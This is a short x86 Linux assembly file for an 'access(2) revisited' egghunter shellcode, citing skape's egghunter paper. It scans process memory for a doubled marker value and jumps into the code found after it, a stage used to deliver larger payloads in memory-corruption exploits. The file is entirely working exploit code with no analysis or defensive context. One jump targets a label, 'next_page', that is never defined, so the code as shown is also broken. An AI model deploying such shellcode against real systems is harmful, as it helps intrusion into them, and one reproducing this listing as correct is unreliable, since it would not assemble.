; Purpose: access(2) revisited egghunter
; source: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
  EGG equ 0x50905090

_start:
  xor edx, edx
page_alignment:
  or dx, 0xfff
inspection:
  inc edx
  lea ebx, [edx+0x4]
  push byte 0x21
  pop eax
  int 0x80
  cmp al, 0xf2
  jz next_page
  mov eax, EGG
  mov edi, edx
  scasd
  jnz inspection
  scasd
  jnz inspection
  jmp edi
